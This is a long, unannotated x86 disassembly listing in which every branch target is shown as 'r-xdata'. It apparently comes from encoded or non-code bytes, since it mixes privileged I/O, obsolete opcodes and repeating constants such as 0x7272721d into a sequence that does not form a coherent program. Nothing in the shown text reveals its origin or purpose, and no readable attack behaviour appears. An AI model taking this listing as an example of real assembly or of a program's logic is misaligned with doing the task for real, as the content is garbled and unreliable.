jb r-xdata
jb r-xdata
jb r-xdata
or bl [ 0x1d1d ]
or edx [ ebx ]
call 0x72b8ae10
jb r-xdata
sub al 0x30
or esp ebx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
test [ ebx + 0x7272721d ] dh
jb r-xdata
mov ebp 0x549f6b84
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0xe2f00d0b
cmpsd [ esi ] [ edi ]
sbb cl [ ebx ]
xor ecx [ eax ]
sbb eax 0x7272721d
jb r-xdata
mov ch dh
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x6f
mov ah dl
loop r-xdata
push ds
loope r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6e7745f0 ] 0xffffffbc
test [ ebx - 0x59 ] ch
push ss
mov [ esi + 0x2b0b2469 ] bh
ja r-xdata
jb r-xdata
out 0xe2 eax
loop r-xdata
mov ah 0xb4
mov ah 0x6f
sbb eax 0x67ed7272
movsb [ edi ] [ esi ]
xchg edi eax
push ss
or eax [ esp + ebp * 8 ]
sbb eax 0x676fb11d
sub bl [ edi ]
sbb eax 0x676fb21d
push esi
sbb bl [ 0xffffffffb41db21d ]
0x676f
bound ebx [ edi + 0x67ede3f2 ]
sub al 0x30
aas
jb r-xdata
xchg edi eax
0xe66ae468 0xd1db
popad
jb r-xdata
jb r-xdata
jpo r-xdata
shr [ ebx ] 0x1
and ch ch
sbb eax 0x72727272
jb r-xdata
outsb
0x88e2e2e2 0x1de2
dec edx
push edx
jb r-xdata
jb r-xdata
mov [ edi - 0x60947b43 ] dl
pop esi
imul ebx [ ebx + ecx ] 0xe2e2ecb7
imul ebx [ edi - 0x425077ac ] 0xffffff84
imul ebx [ edi - 0x7be796a6 ] 0x6b
lahf
pop eax
arpl [ esi + ebx * 2 - 0x1e ] bx
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
mov [ es : 0xffffffff81821c8a ] al
lgs ebp [ ebx - 0x5c ]
test [ edx ] 0x14
xor eax 0x668a1d1d
cmpsd [ esi ] [ edi ]
or [ edx + 0x1d12ad0b ] bh
sbb eax 0x72727272
jb r-xdata
mov [ edi + 0xaa76b84 ] al
mov edx 0x6b848c88
jb r-xdata
outsd
jb r-xdata
jb r-xdata
outsd
loop r-xdata
mov [ 0xffffffffc6e66bfa ] al
and ch ch
imul esp [ edi + 0x1ea7691a ] 0xffffffd9
cmpsd [ esi ] [ edi ]
sbb ch ch
jpe r-xdata
jb r-xdata
mov ah 0x88
retn 0xb4b4
or esi [ edi - 0xe ]
jb r-xdata
into
sbb eax 0x10560a1d
jb r-xdata
mov dh 0x19
sbb eax 0x1db4b21d
loop r-xdata
jb r-xdata
and bl [ 0x7272721d ]
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x36676fb2
pop ds
sbb eax 0x170ab21d
pop ecx
sbb eax 0xf226611d
sub esp [ ecx ]
outsd
out 0xe2 eax
enter 0x1d13 0x1d
jb r-xdata
jb r-xdata
loop r-xdata
std
mov ch ch
jb r-xdata
sbb eax 0x72727272
outsd
imul esp [ edi + 0x72212b1e ] 0x72727272
mov [ edi - 0x60947b43 ] ch
pop edx
imul ebx [ eax ] 0x589f6b84
test [ ebx - 0x61 ] ch
push esp
jb r-xdata
sbb eax 0xed1d671d
jb r-xdata
pushad
in eax dx
jb r-xdata
push ss
imul edi [ edi - 0x7bc396e6 ] 0x6b
mov edi 0xb3a6918
in eax dx
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
push ebx
loop r-xdata
jb r-xdata
pop ds
sbb eax 0x106a0a1d
push edx
jb r-xdata
popad
fsub st2
or ecx eax
mov ah 0xb4
mov ah 0xb4
mov ah 0xb
jpo r-xdata
loop r-xdata
loop r-xdata
pop ds
jb r-xdata
imul esp esi 0x7221bbc6
jb r-xdata
imul esp esi 0xffffffc6
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xed22671d
or dl [ esi + 0x10 ]
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
out dx al
imul esp [ edi - 0x794de216 ] 0x1a612bd1
sbb eax 0xb2377ed
jns r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebx [ eax ] 0x6b849a88
lahf
push esi
test [ ebx - 0x61 ] ch
push eax
pop esp
or edi eax
sbb eax 0x204a67ed
jb r-xdata
jb r-xdata
loop r-xdata
mov bh 0x82
jb r-xdata
jb r-xdata
adc esi [ eax ]
sbb eax 0x7272721d
jb r-xdata
sbb [ ebp + ebx + 0x1d ] 0x72727272
jb r-xdata
sbb eax 0x107c0a1d
jb r-xdata
jb r-xdata
mov ah 0xb
sbb eax 0x9f6f721d
pop edx
outsd
outsd
push edx
pop ds
jb r-xdata
lahf
jb r-xdata
or edi ecx
out 0xe2 eax
loop r-xdata
sbb eax 0x1d107c0a
jb r-xdata
sub esp [ ecx ]
test [ ebx - 0x59 ] ch
adc [ edx - 0x7b436e78 ] bh
imul esp [ edi + 0x69be8816 ] 0x24
or ebp [ ebx ]
loop r-xdata
jb r-xdata
adc [ 0xffffffffed22671d ] bl
pop esp
sbb eax 0xd861841d
loop r-xdata
adc eax 0xe60bb51b
sub eax 0x72721d1d
in eax dx
movsb [ di ] [ si ]
jb r-xdata
jb r-xdata
sbb [ 0x1db4b21d ] ebx
sbb eax 0x7272721d
jb r-xdata
push esi
jb r-xdata
jb r-xdata
sbb [ 0x2267bb1d ] ebx
in eax dx
stosd [ di ]
pop ds
sbb eax 0x3420b1d
sbb eax 0x7272721d
test [ ebx - 0x59 ] ch
add al 0xba
or edx [ eax + 0x2d ]
sbb eax 0x66ed721d
0x8a1d1d3a 0xbbcd
pop es
jl r-xdata
mov ah 0xa
cwde
pop ebp
sbb eax 0xee26611d
and [ 0xffffffffed1d671d ] bl
jb r-xdata
in eax dx
and [ 0xfffffffff2a16f1d ] bl
dec edx
jb r-xdata
jb r-xdata
loop r-xdata
mov eax 0x6b848088
jb r-xdata
or cl [ eax + 0x6b84bd8f ]
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x67ed2267
hlt
or bh [ eax + edx + 0x1d ]
jb r-xdata
loop r-xdata
sbb eax 0x67ed2267
jb r-xdata
mov [ 0xffffffff881d1d5a ] ax
jb r-xdata
jb r-xdata
or cl [ esi ]
pop eax
sbb eax 0xee26611d
and ch ch
mov dl 0xb
shr [ ebx ] cl
sbb eax 0x7272721d
jl r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or esp [ edi - 0x1e ]
sbb eax 0x55edfeb5
movsb [ edi ] [ esi ]
in al 0xb
popfd
sub [ 0x7272721d ] bl
mov dl dl
imul ebp [ edx ] 0x72721d1d
jb r-xdata
sbb eax 0x67ed1d67
jb r-xdata
sbb eax 0xf2a16f1d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov [ ebp - 0x58947b48 ] al
add [ ebx + ebp * 2 - 0x7b477f49 ] 0x6b
mov bh 0x86
jb r-xdata
sbb [ eax ] esi
jb r-xdata
jb r-xdata
lahf
jb r-xdata
or [ eax + 0x6b84bd8a ] cl
lahf
mov ebp 0xa9f6b84
jb r-xdata
jb r-xdata
jb r-xdata
hlt
adc [ 0xffffffffed22671d ] bl
jb r-xdata
and ch ch
jb r-xdata
pop esp
jb r-xdata
sbb eax 0x72727272
jb r-xdata
pop edx
sbb eax 0xba8d881d
jb r-xdata
jb r-xdata
sbb eax 0xed22671d
mov bh 0xb
mov [ 0x721d1d07 ] eax
adc ebx [ 0x7272721d ]
jb r-xdata
sbb esi [ ebp + 0x1d2de60b ]
sbb eax 0x72727272
loop r-xdata
jb r-xdata
push edx
sub ch [ edi + 0x6f ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xb51d0697
sbb eax 0x204a67ed
jb r-xdata
outsd
jb r-xdata
imul esi [ edi + 0x6b84b880 ] 0xffffffb7
fwait
sahf
sbb eax 0x7272721d
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
mov [ edi - 0x60947b43 ] cl
jb r-xdata
imul ebx [ edi - 0x427077f6 ] 0xffffff84
imul ebx [ edi + 0x6b84bd00 ] 0xffffff9f
jb r-xdata
jb r-xdata
outsd
jb r-xdata
or esp [ ebx + 0x721d1d07 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x5c ] ch
sbb eax 0xb2bb5a1d
jb r-xdata
sbb eax 0xbba8d88
sbb al [ ebx + 0x7272721d ]
jb r-xdata
jb r-xdata
imul esp [ edi + 0x1ea7691e ] 0xffffffe1
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] bl
or edi eax
jb r-xdata
or dh [ edx + 0xb1d1d36 ]
or esi [ ebx ]
or bl [ 0xffffffffb172721d ]
loop r-xdata
jb r-xdata
jb r-xdata
lahf
or dh cl
push cs
mov [ ebp + 0x1d18d60b ] al
sbb eax 0x72727272
jb r-xdata
mov ebp 0x89f6b84
mov [ edx - 0x60947b43 ] cl
jb r-xdata
jb r-xdata
or ebx [ ecx ]
jb r-xdata
add [ ebp + 0xa9f6b84 ] bh
jb r-xdata
jb r-xdata
mul [ es : edi + 0x22 ]
jb r-xdata
pop edx
jb r-xdata
pop sp
jb r-xdata
lea edi [ edx + 0x1d041a0b ]
jb r-xdata
sbb eax 0x25000b1d
lahf
jb r-xdata
jb r-xdata
into
jb r-xdata
sbb eax 0xed22671d
mov bx 0x1d32
sbb eax 0x130b22d1
nop [ 0x72727272 ] ebx
jb r-xdata
or ch [ edx + 0x10 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
clc
jb r-xdata
sbb eax 0x1d5bd90a
jb r-xdata
jb r-xdata
mov dl 0x36
sbb eax 0x30190b1d
test [ ebx - 0x49 ] ch
pop esp
mov eax 0x6b848d88
mov bh 0x22
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x6f
imul ebx [ edi - 0x427577f8 ] 0xffffff84
imul ebx [ edi + 0xb85880e ] 0xffffffd6
jb r-xdata
xor [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
loop r-xdata
mov dl 0xe2
jb r-xdata
pop esp
jb r-xdata
or ebx [ edx ]
jb r-xdata
mov ah 0xa
fldcw [ eax ]
loop r-xdata
outsd
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x2472721d
cmpsd [ esi ] [ edi ]
sbb eax 0xe7ce0ae2
loop r-xdata
mov dl 0xb5
or esi [ edx + ebx ]
imul esp edx 0x6bfaa269
out 0xc6 al
je r-xdata
sbb eax 0xbf2a16f
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
push 0xd1e2e2ec
loop r-xdata
sbb eax 0x1dee2661
jne r-xdata
fstp [ ebx + 0x1d ]
mov ch 0x6b
movsb [ edi ] [ esi ]
0x1d36e50a 0x8a1d
jb r-xdata
and cl [ ebx ]
mov eax 0x721d1d59
fldcw [ ecx ]
jb r-xdata
or edi [ eax + 0x721d1d59 ]
or bl [ esi + 0x61e2e2e1 ]
jb r-xdata
lahf
jb r-xdata
out 0x66 eax
loop r-xdata
cmp [ 0xffffffffc6a6691d ] ebx
sbb eax 0xe266e7d2
loop r-xdata
int1
sbb eax 0x72727272
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
and eax 0xe28813a7
mov dl ah
and eax 0xe28817a7
xor edi [ esi ]
jb r-xdata
loop r-xdata
or ebp [ edx ]
jb r-xdata
imul esp [ edx + ebp * 8 + 0xbf2a769 ] 0xffffff9d
loope r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xe2b2bb5a
jb r-xdata
add al 0x1d
jb r-xdata
or eax [ ecx + 0x721d1d5c ]
xor [ edi ] 0x646b1d1d
push esi
loop r-xdata
mov ah 0xb4
or edi [ ebx + 0x11 ]
outsd
jb r-xdata
loop r-xdata
mov eax [ 0x38f80bf2 ]
jb r-xdata
jb r-xdata
jb r-xdata
adc esp [ esi + 0x30 ]
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov [ esi + 0xb8688ba ] bh
stosb [ edi ]
out 0xe2 eax
loop r-xdata
push ds
loop r-xdata
in eax dx
jne r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
outsd
in al dx
fwait
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
in al 0xe2
jb r-xdata
jb r-xdata
mov ebx 0x84e2e2b2
jb r-xdata
sbb eax 0xe6a46b1d
or dl [ esi - 0x75e2e2c9 ]
and [ ebp + 0x45 ] 0xd4
mov ch 0x6b
push edx
loop r-xdata
imul ebx [ esi + 0xab4f6c6 ] 0xffffffd9
imul esp [ esi + 0x1d37960a ] 0x1d
mov al [ edx - 0x4a2bba9b ]
imul esp [ edx + edx * 2 - 0x1e ] 0xffffffe2
or ch [ edi + 0x6f ]
jb r-xdata
mov ah 0xf6
or edx [ ecx + edx + 0xb721d1d ]
xor eax 0xffffffe2
loop r-xdata
loop r-xdata
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
xor ch ch
jb r-xdata
jb r-xdata
jb r-xdata
and esp eax
mov ch 0x69
sbb [ ecx + 0x18 ] ah
iretd
or al 0x29
sbb eax 0x7272721d
popad
xor al [ ebx + ebp * 2 - 0x7747a749 ]
xchg [ ebx + ebp * 2 - 0x7747a149 ] al
add [ ebx + ebp * 2 - 0x7747a349 ] 0x8d
test [ ebx - 0x49 ] ch
sbb eax 0x7272721d
fstp [ ecx ]
in eax dx
cmpsd [ esi ] [ edi ]
adc cl [ eax + 0xb216990 ]
and [ esi ] bl
loop r-xdata
or cl bl
push es
sbb eax 0xed21d91d
push 0xe2ec
jne r-xdata
jb r-xdata
sub [ 0x25000b1d ] bl
or bl cl
outsd
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
fldenv [ ecx ]
in eax dx
jb r-xdata
0xbf2a769 0xe19d
jb r-xdata
loop r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
sbb eax 0xea76f1d
jb r-xdata
shr [ esi ] cl
sub ecx [ ebx ]
jb r-xdata
popad
sbb bh cl
or esi [ ebx + 0x5 ]
sbb eax 0x88ba721d
xchg [ ecx + 0x12a76b84 ] edi
or ecx [ ecx + 0x1d1d1d2a ]
cmc
or edi [ eax + 0x721d1d5f ]
jb r-xdata
mov [ ebx + 0x6a76b84 ] ch
jb r-xdata
jb r-xdata
mov cl 0x61
mov [ eax + 0x200b2169 ] dl
sbb eax 0x8788ba72
mov ecx 0x12a76b84
adc al 0xd9
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x1bd5f4e2 ] 0xffffffe2
stosb [ edi ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
outsd
jb r-xdata
loop r-xdata
jb r-xdata
push es
test [ ebx - 0x59 ] ch
jb r-xdata
sbb cl cl
jb r-xdata
or ecx [ edi + ecx + 0x72721d1d ]
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
fcom [ esi ]
sbb eax 0xd5da8a1d
mov dl ah
test [ 0x321d1ba7 ] ah
cmpsd [ esi ] [ edi ]
adc ecx [ eax + 0x25e288e2 ]
or ecx [ ecx + 0x72e2e2e9 ]
jb r-xdata
sbb eax 0xdcd5da8a
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
sub ecx [ bp + di ]
movsb [ edi ] [ esi ]
jb r-xdata
push cs
test [ ebx - 0x59 ] ch
add [ ebx ] cl
mov cl 0xe7
loop r-xdata
outsb
pop ecx
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x72727272
imul esi [ edi - 0x6e7747c4 ] 0xffffff84
imul esi [ edi - 0x7bcc96fe ] 0x6b
mov bh 0x0
imul esp [ esi + ecx - 0x1e ] 0xffffffe2
sbb eax 0xb172721d
popad
jb r-xdata
sbb eax 0x25727272
jb r-xdata
loop r-xdata
jb r-xdata
fcmovbe st5
jb r-xdata
jb r-xdata
imul esp [ edi - 0x1e62f40e ] 0x7272e2e2
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ ebx + ebp * 2 - 0x7745f359 ] eax
mov [ ecx + 0x2a ] gs
jb r-xdata
xor eax [ ebx + ebp * 2 - 0x64f4ff49 ]
aas
sbb eax 0x751d721d
dec edx
loop r-xdata
push 0xe654edf3
in al dx
jb r-xdata
mov edx 0x6b84ab88
lahf
sbb cl [ ebx ]
neg [ ecx + 0x1d ]
and cl [ ebx ]
pop ss
jecxz r-xdata
mul [ edi + 0x22 ]
jb r-xdata
sbb [ 0x7272721d ] bl
jb r-xdata
and ebp ebp
jb r-xdata
and [ ebx ] ecx
rcl [ ecx + ebx * 8 ] 0x1
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ eax + 0x721d1d2a ]
jb r-xdata
loop r-xdata
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
jb r-xdata
or eax 0x72e2e2f0
jb r-xdata
or dl [ edi ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul esp [ edi - 0x737745f4 ] 0x69
sub cl [ ebx ]
dec eax
pop esp
jb r-xdata
jb r-xdata
loop r-xdata
in eax dx
push esp
in eax dx
push esp
jb r-xdata
or ebx [ ebx + 0x721d1d3f ]
sbb eax 0xe2e24a75
mov [ ecx + 0x2b76b84 ] dl
imul esi [ ebx ] 0xb76b84
loop r-xdata
and ch ch
jb r-xdata
jb r-xdata
jge r-xdata
sbb ebp ebp
fldenv [ ecx ]
jb r-xdata
loop r-xdata
mov ah 0xea
mov [ esi - 0x5990e22f ] ah
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edx + 0x2aa00be6 ] 0x72721d1d
jb r-xdata
pop ecx
sub [ 0x7272721d ] bl
jb r-xdata
sub ecx [ ebx ]
loop r-xdata
jb r-xdata
sbb eax 0xa66fbb1d
jb r-xdata
or al 0xba
jb r-xdata
and eax 0x1d0466ed
sbb eax 0x67bcbd1d
leave
test [ ebx - 0x49 ] ch
cmp al 0xb8
out 0xec al
jb r-xdata
0x1d1e971d 0x697
jb r-xdata
jb r-xdata
or ebx eax
jb r-xdata
0x1dd1a688 0xa66f
sbb eax 0x72727272
jb r-xdata
jb r-xdata
or bl cl
pop ebx
sbb eax 0xee26611d
sbb eax 0xe2e24a75
jb r-xdata
push ss
mov bl dl
jb r-xdata
pop edx
test [ 0x67bb1d1d ] dh
and ch ch
jb r-xdata
jb r-xdata
sbb eax 0xc6a66fbb
fimul [ ebx ]
retn
jb r-xdata
mov [ ecx + ebp * 2 + 0x5c480b2a ] cl
in eax dx
xchg edi eax
push ds
jb r-xdata
jb r-xdata
adc eax 0x72721d1d
jb r-xdata
aad 0xdc
jb r-xdata
jb r-xdata
in al dx
jb r-xdata
push cs
loop r-xdata
imul esp [ edx + ebx * 4 + 0x1d36e50a ] 0x1d
cdq
cld
aaa
mov ch 0x6b
stosd [ edi ]
imul esi [ ecx ] 0xa46bb57c
or ah ch
cmp bl [ 0xffffffffa226611d ]
mov bl [ edx + eax * 4 ]
imul esp [ edi + 0x8330b1a ] 0x72721d1d
jb r-xdata
outsd
cmpsb [ esi ] [ edi ]
jb r-xdata
sbb eax 0xb51d0697
jb r-xdata
loop r-xdata
sbb eax 0x88ba7272
sbb eax 0xa688eab4
rcr [ 0xffffffffaec6a66f ] 0x1
mov ch 0xb2
or ah dh
pop eax
sbb eax 0xa680b1d
out 0xb al
mov al [ 0x721d1d2a ]
sbb al 0x84
imul ebx [ edi - 0x7be22efe ] 0x6b
loop r-xdata
jb r-xdata
loop r-xdata
or [ edi ] 0xf6a46bb5
or dl [ esi + 0x668a1d1d ]
sbb eax 0x8aa22661
sbb al 0x82
jb r-xdata
jb r-xdata
push es
sbb eax 0x1db1feb5
xchg edi eax
or bl [ 0xffffffffe2e27a75 ]
loop r-xdata
in eax dx
pop di
sbb eax 0xeebfdb1d
in eax dx
0x1d5f 0x691d
loop r-xdata
jb r-xdata
push ds
xchg [ ebx + ebp * 2 - 0x7745f559 ] eax
mov [ ebx + ebp * 2 + 0xbba08a7 ] es
lodsd [ esi ]
adc bl [ 0x7272721d ]
jb r-xdata
or eax ebx
and [ 0x7272721d ] ebx
jb r-xdata
mov dl 0x84
imul esp [ ebp - 0x591e7b20 ] 0x55edfec6
and dh [ edx - 0x23f5db97 ]
daa
sbb eax 0xee26611d
push ss
in eax dx
pushad
adc eax 0x6f1d1d03
cmpsd [ esi ] [ edi ]
add dh [ edx + 0x1db6941d ]
mov edi 0xba66edee
loop r-xdata
loop r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
jb r-xdata
in eax dx
imul ecx [ esi ] 0xd1b5b3b3
sbb eax 0x1d28360b
sbb eax 0x72727272
jb r-xdata
imul esp [ esi + 0x2267fac6 ] 0xffffffed
out dx al
and ax 0x1d5a
sbb eax 0xe2ea9d61
xchg edi eax
sbb eax 0x25690e97
or ebp [ edx + 0x72e2e2f2 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
pop ss
mov dl ah
fcom [ 0x72721d1d ]
jb r-xdata
or cl [ edx ]
jb r-xdata
xor [ edx + 0x1d ] bl
sbb eax 0xc6c69e61
loop r-xdata
cli
and ch ch
imul ebp [ edx ] 0x1d27260a
sbb eax 0xe2ebda0b
loop r-xdata
mov dl 0xd9
mov dh 0xea
mov dl 0xed
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xba72721d
jb r-xdata
xor eax 0xee8a1d1d
jb r-xdata
push ss
jb r-xdata
sbb eax 0xe252741d
loop r-xdata
loop r-xdata
sbb eax 0x6bee2661
cmpsb [ esi ] [ edi ]
imul esp [ edi - 0x33774504 ] 0xffffffbc
mov [ edi - 0x3d58947c ] al
imul esp [ esp + eax * 4 ] 0xbc0a76b
loope r-xdata
jb r-xdata
and cl [ ebx ]
outsb
add ebx [ 0xffffffffdb72721d ]
cmpsd [ esi ] [ edi ]
or ecx [ eax + 0x5c ]
mov [ edi + 0xca76b84 ] al
mov edx 0x2a698c88
jb r-xdata
jb r-xdata
sbb eax 0x214dee8a
jb r-xdata
or esp [ ebx + ecx ]
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
popad
push cs
mov cl 0xb5
sbb eax 0xe2e25674
je r-xdata
imul edi [ edi + 0x135b0b1e ] 0x1d
sbb eax 0x72727272
imul esp [ esi - 0x1597193a ] 0x21fd0ba2
sbb eax 0xedaa721d
push ebp
loop r-xdata
sbb eax 0x7272721d
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
adc al 0xb
mov [ esi ] ss
push edx
jb r-xdata
jb r-xdata
out dx al
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
mov [ 0xb1ea76b ] al
and bl [ eax ]
scasd [ edi ]
push ds
mov bl 0xb2
mov al ah
mov bh [ edi + ecx * 4 ]
xor eax 0xe9d80b41
loop r-xdata
sub ebx [ 0x1e87611d ]
or ebx [ 0xffffffffbe66ed1d ]
jb r-xdata
sbb eax 0xbe66ed1d
and al 0xb
jb r-xdata
jb r-xdata
jb r-xdata
push cs
loop r-xdata
mov ecx 0xb469212b
outsd
loop r-xdata
or ebx [ esi + 0xf ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
pop edx
sbb eax 0xc69e611d
in ax 0xe2
loop r-xdata
test eax 0x58100b6e
sbb eax 0x69b7721d
shl [ edx ] 0x1
fistp [ edi + 0x309d0b1e ]
sbb eax 0x7272721d
stosd [ edi ]
jb r-xdata
jb r-xdata
or esi edx
in al dx
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x2bbe66ed
sbb eax 0x1e87611d
mov cl ah
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor bl [ edi + 0x1d ]
sbb eax 0x72727272
jb r-xdata
mov ch 0x1d
je r-xdata
sbb eax 0x99638a1d
jb r-xdata
push ebp
or edi edx
or bh [ edx + 0x6b848388 ]
cmpsd [ esi ] [ edi ]
or [ ebx ] cl
cli
cmp [ edx + 0x6b848688 ] 0xa7
imul esp [ edx + ecx ] 0x1d1d2e17
mov ebx 0xdac6a66f
imul esp [ edi + 0x2a890b06 ] 0x1d
sbb eax 0xb80bf51d
pop edi
sbb eax 0x7272721d
jb r-xdata
mov ch 0x6b
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
imul esp [ edi - 0x58945de2 ] 0x18220b1e
shl [ eax ] cl
pop bx
add ebx [ 0x24170b1d ]
sbb eax 0xd2a46b1d
or bh [ ecx - 0x75e2e2ce ]
sbb eax 0x24170b1d
jb r-xdata
jb r-xdata
jb r-xdata
or ebx eax
jmp 0x72b8b4cf
loop r-xdata
jb r-xdata
mov cl 0x1d
xchg esi eax
ffreep st1
mov ah [ ebx - 0x67 ]
jb r-xdata
imul ebx [ edi + 0x59f60b1a ] 0x1d
movsb [ edi ] [ esi ]
jb r-xdata
test [ ebx - 0x51 ] ch
dec edx
mov ah 0x6f
mov bh 0x69
push cs
or ecx [ esi + 0x7272e2e2 ]
jb r-xdata
arpl [ ecx + 0xbb5c1df ] bx
or edx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x52741d1d
xchg [ ebx + ebp * 2 - 0x7745f559 ] al
add [ ebx + ebp * 2 - 0x5f4f759 ] 0x55
loop r-xdata
je r-xdata
jb r-xdata
cdq
jb r-xdata
or bh [ eax ]
xor eax 0x2f8a1d1d
mul dl
loop r-xdata
fld [ edi - 0x5b9b1212 ]
outsd
scasd [ edi ]
or esi eax
push eax
sbb eax 0x7272721d
jb r-xdata
inc [ eax ]
sbb eax 0x66ed721d
lds ebp [ esi ]
sbb eax 0x36af6f1d
or esi eax
imul ebx [ edi + 0xfe0b74 ] 0x1d
sbb eax 0xc566ed72
sbb eax 0x36af6f1d
imul ebx [ edi + 0x36 ] 0x1f
sbb eax 0xf2b41d1d
or ebp eax
push cs
sbb eax 0x6f1b691d
outsd
sub bl [ edi ]
pop esi
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
sbb eax 0xbb1721d
pop ss
loop r-xdata
jb r-xdata
shl [ ebp + 0x1d30d20b ] 0x1d
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x5c
sbb eax 0x7272721d
jb r-xdata
outsd
cmpsd [ esi ] [ edi ]
sbb eax 0xdf99638a
jb r-xdata
mov dl [ edx + 0x5c ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x3e0a0a1d
sbb eax 0x17bb0b1d
imul ebx [ ebx ] 0x1f2a6f6f
jb r-xdata
sbb eax 0xe2e24e74
or edx edx
xor [ 0x7272721d ] bl
jb r-xdata
cmpsd [ esi ] [ edi ]
adc al 0xba
mov [ esp + eax * 4 - 0x45e55895 ] al
mov ah cl
test [ ebx - 0x59 ] ch
sbb [ edx + 0x1d1dca0b ] bh
sbb eax 0x32a76b84
or ebx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
insd
adc [ 0x7272721d ] ebx
mov cl 0xb
jb r-xdata
pop esp
jb r-xdata
loop r-xdata
mov esi 0x900af6c6
sub ebx [ 0xb1dd11d ]
jb r-xdata
sbb eax 0x9e0a96b4
pop edi
sbb eax 0xed22671d
in eax 0xe2
je r-xdata
xor cl [ ebx ]
jne r-xdata
sbb eax 0x55edaa72
or esp [ ecx - 0x18 ]
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
cli
in eax dx
xor dl [ fs : ecx + 0x1d ]
sbb eax 0xf2c68661
jb r-xdata
sbb eax 0x2267aeb2
in eax dx
insb
sub ebx [ 0x526f6f1d ]
pop ds
sbb eax 0x20390a1d
sbb eax 0x169f6f1d
outsd
outsb
pop ds
sbb eax 0x9f6b841d
je r-xdata
outsd
cmpsd [ esi ] [ edi ]
test [ cs : ebx - 0x69 ] ch
dec esi
imul edx [ edi + 0x6b84b2ea ] 0x6fb44aaf
jb r-xdata
jb r-xdata
in eax dx
and bl bl
lahf
push ds
or ebx [ ebp + 0x721d1d30 ]
jb r-xdata
jb r-xdata
or ebp [ ebp + 0x11 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xe2e24e74
cmpsd [ esi ] [ edi ]
push ds
push 0xea6aeeaf
sbb eax 0x8aee2661
loop r-xdata
mov cl 0x1d
loop r-xdata
in al dx
loop r-xdata
jb r-xdata
jb r-xdata
fsubrp st1
in eax dx
aaa
pop esi
sbb eax 0xc69e611d
mul bl
in eax dx
sub [ esi + 0x1d ] bl
sbb eax 0x1d38b10b
sbb eax 0x1d130a0a
sbb eax 0x19126f6f
sbb eax 0x23880a1d
mov dl 0x6f
jb r-xdata
imul esi [ edi - 0x47c49660 ] 0xb
lahf
or ebx [ 0xffffffff8495881d ]
sbb eax 0x721d1d39
jb r-xdata
movsb [ edi ] [ esi ]
sbb bl [ 0x7272721d ]
jb r-xdata
or al [ eax + 0x9 ]
sbb eax 0xed22671d
clc
sbb ebx [ 0x3a9f6f1d ]
outsd
outsd
push edx
pop ds
sbb eax 0xe1730b1d
loop r-xdata
outsd
lahf
push ss
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
or esp [ edx ]
sbb [ 0x7272721d ] bl
sub ecx [ bp + di ]
mov ch 0xb
